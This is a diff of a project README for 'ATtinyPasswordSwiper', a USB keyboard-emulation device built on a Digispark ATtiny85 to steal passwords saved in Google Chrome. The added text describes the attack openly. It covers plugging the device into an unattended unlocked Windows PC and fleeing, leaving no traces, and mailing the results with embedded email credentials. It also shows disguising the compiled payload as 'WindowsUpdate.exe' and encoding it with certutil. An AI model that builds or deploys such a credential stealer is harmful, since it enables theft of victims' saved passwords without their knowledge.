@@ -1,6 +1,6 @@
 # ATtinyPasswordSwiper
 
- This project demonstrates how USB keyboard emulation can be exploited for malicious purposes using the Digispark ATtiny85 development board.
+ This project demonstrates how USB keyboard emulation can be exploited using the Digispark ATtiny85 development board to swipe passwords saved in Google Chrome.
  
 ![](https://cdn.instructables.com/FKP/MAA2/HH2VJNW1/FKPMAA2HH2VJNW1.SMALL.jpg)
  ------
@@ -8,8 +8,18 @@
  * Minimize time for attacker to keep device plugged in
  * Fit initial exploit code onto limited flash memory on ATtiny85
  * Leave no traces behind after victim has been pwned
- ------
- # Software:
+# Attack:
+1. Victim plugs in unknown USB device with ATtiny and code implanted
+2. Attack executes
+
+**OR**
+
+1. Victim leaves Windows computer unattended and unlocked to get some coffee
+2. Attacker approaches with hotspot(Ex. 'attwifi') ***This is only necessary if there are browsing restrictions on the host network***
+3. Attacker plugs in ATtiny via USB and waits for red LED signal.
+4. Attacker unplugs device and flees the scene
+5. Attack executes
+# Software:
  
 ### payload.ino
 * AtTiny84 emulates keyboard
@@ -37,9 +47,9 @@
  
  
  
+------
  
- 
- Compiling Instructions:
+ ### Compiling Instructions:
  1. Update WindowsUpdate.py with valid email credentials.
  2. Use py2exe to compile into exe file (since most Windows PCs don't come with Python).
  3. In command prompt run: certutil -encode WindowsUpdate.exe "certification.txt"
